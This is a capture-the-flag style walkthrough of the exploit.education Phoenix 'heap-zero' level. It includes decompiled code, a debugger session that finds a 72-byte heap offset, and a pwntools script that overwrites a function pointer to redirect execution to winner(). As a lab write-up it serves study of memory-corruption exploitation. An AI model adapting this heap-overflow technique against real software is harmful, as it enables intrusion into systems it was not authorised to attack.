# &#35; heap-0

#### &#42; pseudocode using ghidra
```bash


undefined4 main(int param_1,int param_2)

{
  char *__dest;
  code **ppcVar1;
  
  puts("Welcome to phoenix/heap-zero, brought to you by https://exploit.education");
  if (param_1 < 2) {
    puts("Please specify an argument to copy :-)");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  __dest = (char *)malloc(0x40);
  ppcVar1 = (code **)malloc(0x40);
  *ppcVar1 = nowinner;
  strcpy(__dest,*(char **)(param_2 + 4));
  printf("data is at %p, fp is at %p, will be calling %p\n",__dest,ppcVar1,*ppcVar1);
  fflush(stdout);
  (**ppcVar1)();
  return 0;
}


void nowinner(void)

{
  puts("level has not been passed - function pointer has not been overwritten");
  return;
}


void winner(void)

{
  puts("Congratulations, you have passed this level");
  return;
}


$ objdump -t /opt/phoenix/i486/heap-zero | grep winner
0804884e g     F .text	00000019 nowinner
08048835 g     F .text	00000019 winner


```


#### &#42; check to binary
```bash
$ file /opt/phoenix/i486/heap-zero
/opt/phoenix/i486/heap-zero: setuid, setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV),
  dynamically linked, interpreter /opt/phoenix/i486-linux-musl/lib/ld-musl-i386.so.1, not stripped

$ checksec /opt/phoenix/i486/heap-zero
[*] '/opt/phoenix/i486/heap-zero'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
    RPATH:    '/opt/phoenix/i486-linux-musl/lib'

```



#### &#42; how it work
```bash
$ /opt/phoenix/i486/heap-zero
Welcome to phoenix/heap-zero, brought to you by https://exploit.education
Please specify an argument to copy :-)
$

$ /opt/phoenix/i486/heap-zero AAAA
Welcome to phoenix/heap-zero, brought to you by https://exploit.education
data is at 0xf7e69008, fp is at 0xf7e69050, will be calling 0x804884e
level has not been passed - function pointer has not been overwrittenA

```


#### &#42; vulnerable point
```bash
#### we can overwrite *ppcVar1 variable using strcpy(__dest,*(char **)(param_2 + 4))
```


#### &#42; stack structure
#### __dest[64] + prev[4] + size[4] + &nowinner
```bash

$ gdb /opt/phoenix/i486/heap-zero -q

GEF for linux ready, type `gef' to start, `gef config' to configure
71 commands loaded for GDB 8.2.1 using Python engine 3.5
[*] 2 commands could not be loaded, run `gef missing` to know why.
Reading symbols from /opt/phoenix/i486/heap-zero...(no debugging symbols found)...done.
gef>
gef> disas main
Dump of assembler code for function main:
   0x08048867 <+0>:	lea    ecx,[esp+0x4]
   0x0804886b <+4>:	and    esp,0xfffffff0
   0x0804886e <+7>:	push   DWORD PTR [ecx-0x4]
   0x08048871 <+10>:	push   ebp
   0x08048872 <+11>:	mov    ebp,esp
   0x08048874 <+13>:	push   ebx
   0x08048875 <+14>:	push   ecx
   0x08048876 <+15>:	sub    esp,0x10
   0x08048879 <+18>:	mov    ebx,ecx
   0x0804887b <+20>:	sub    esp,0xc
   0x0804887e <+23>:	push   0x804ac44
   0x08048883 <+28>:	call   0x8048600 <puts@plt>
   0x08048888 <+33>:	add    esp,0x10
   0x0804888b <+36>:	cmp    DWORD PTR [ebx],0x1
   0x0804888e <+39>:	jg     0x80488aa <main+67>
   0x08048890 <+41>:	sub    esp,0xc
   0x08048893 <+44>:	push   0x804ac90
   0x08048898 <+49>:	call   0x8048600 <puts@plt>
   0x0804889d <+54>:	add    esp,0x10
   0x080488a0 <+57>:	sub    esp,0xc
   0x080488a3 <+60>:	push   0x1
   0x080488a5 <+62>:	call   0x8048680 <exit@plt>
   0x080488aa <+67>:	sub    esp,0xc
   0x080488ad <+70>:	push   0x40
   0x080488af <+72>:	call   0x8049146 <malloc>
   0x080488b4 <+77>:	add    esp,0x10
   0x080488b7 <+80>:	mov    DWORD PTR [ebp-0xc],eax
   0x080488ba <+83>:	sub    esp,0xc
   0x080488bd <+86>:	push   0x40
   0x080488bf <+88>:	call   0x8049146 <malloc>
   0x080488c4 <+93>:	add    esp,0x10
   0x080488c7 <+96>:	mov    DWORD PTR [ebp-0x10],eax
   0x080488ca <+99>:	mov    eax,DWORD PTR [ebp-0x10]
   0x080488cd <+102>:	mov    DWORD PTR [eax],0x804884e
   0x080488d3 <+108>:	mov    eax,DWORD PTR [ebx+0x4]
   0x080488d6 <+111>:	add    eax,0x4
   0x080488d9 <+114>:	mov    edx,DWORD PTR [eax]
   0x080488db <+116>:	mov    eax,DWORD PTR [ebp-0xc]
   0x080488de <+119>:	sub    esp,0x8
   0x080488e1 <+122>:	push   edx
   0x080488e2 <+123>:	push   eax
   0x080488e3 <+124>:	call   0x80485b0 <strcpy@plt>
   0x080488e8 <+129>:	add    esp,0x10
   0x080488eb <+132>:	mov    eax,DWORD PTR [ebp-0x10]
   0x080488ee <+135>:	mov    eax,DWORD PTR [eax]
   0x080488f0 <+137>:	push   eax
   0x080488f1 <+138>:	push   DWORD PTR [ebp-0x10]
   0x080488f4 <+141>:	push   DWORD PTR [ebp-0xc]
   0x080488f7 <+144>:	push   0x804acb8
   0x080488fc <+149>:	call   0x80485d0 <printf@plt>
   0x08048901 <+154>:	add    esp,0x10
   0x08048904 <+157>:	mov    eax,ds:0x804c2c0
   0x08048909 <+162>:	sub    esp,0xc
   0x0804890c <+165>:	push   eax
   0x0804890d <+166>:	call   0x8048610 <fflush@plt>
   0x08048912 <+171>:	add    esp,0x10
   0x08048915 <+174>:	mov    eax,DWORD PTR [ebp-0x10]
   0x08048918 <+177>:	mov    eax,DWORD PTR [eax]
   0x0804891a <+179>:	call   eax
   0x0804891c <+181>:	mov    eax,0x0
   0x08048921 <+186>:	lea    esp,[ebp-0x8]
   0x08048924 <+189>:	pop    ecx
   0x08048925 <+190>:	pop    ebx
   0x08048926 <+191>:	pop    ebp
   0x08048927 <+192>:	lea    esp,[ecx-0x4]
   0x0804892a <+195>:	ret
End of assembler dump.
gef>

gef> p winner
$1 = {<text variable, no debug info>} 0x8048835 <winner>
gef> p nowinner
$2 = {<text variable, no debug info>} 0x804884e <nowinner>
gef>


gef> b *0x080488af
Breakpoint 1 at 0x80488af
gef> r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

gef> x/xw $eax            => __dest[64]
0xf7e69008:	0x00000000

gef> x/xw $eax            => ppcVar1[64]
0xf7e69050:	0x00000000
gef>


gef> x/24xw 0xf7e69008
0xf7e69008:	0x41414141	0x41414141	0x41414141	0x41414141
0xf7e69018:	0x41414141	0x41414141	0x41414141	0x41414141
0xf7e69028:	0x41414141	0x00000000	0x00000000	0x00000000
0xf7e69038:	0x00000000	0x00000000	0x00000000	0x00000000
0xf7e69048:	0x00000000	0x00000049	0x0804884e	0x00000000
0xf7e69058:	0x00000000	0x00000000	0x00000000	0x00000000
gef> p/d 0xf7e69050-0xf7e69008
$3 = 72
gef>


```

#### &#42; payload
```bash
#### __dest[64] + ppcVar1[64]
#### __dest[64] + { prev[4] + size[4] + &nowinner }
payload  = b""
payload += b"A"*72
payload += p32(0x8048835)

```

#### &#42; exploit code
```bash
$ cat exp_heap0.py
from pwn import *

context.arch='i386'
#context.log_level='debug'

filename="/opt/phoenix/i486/heap-zero"
conn = process(filename)

payload  = b""
payload += b"A"*72
payload += p32(0x8048835)

conn = process([filename, payload])
print( conn.recvline() )

conn.interactive()



$ python exp_heap0.py
[+] Starting local process '/opt/phoenix/i486/heap-zero': pid 2727
[+] Starting local process '/opt/phoenix/i486/heap-zero': pid 2729
Welcome to phoenix/heap-zero, brought to you by https://exploit.education

[*] Switching to interactive mode
[*] Process '/opt/phoenix/i486/heap-zero' stopped with exit code 0 (pid 2729)
data is at 0xf7e69008, fp is at 0xf7e69050, will be calling 0x8048835
Congratulations, you have passed this level
[*] Got EOF while reading in interactive
$
```


